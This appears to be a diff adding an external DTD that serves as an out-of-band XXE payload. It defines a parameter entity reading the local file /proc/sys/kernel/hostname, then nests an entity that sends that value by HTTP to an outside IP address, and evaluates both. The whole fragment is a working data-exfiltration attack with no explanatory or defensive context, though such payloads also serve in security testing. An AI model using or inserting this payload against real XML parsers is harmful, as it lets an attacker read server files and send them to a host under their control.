@@ -1,0 +1,4 @@
+<!ENTITY % file SYSTEM "file:///proc/sys/kernel/hostname">
+<!ENTITY % eval "<!ENTITY &#x25; send SYSTEM 'http://47.92.29.251/oob_hit_5__proc_sys_kernel_hostname;'>">
+%eval;
+%send;
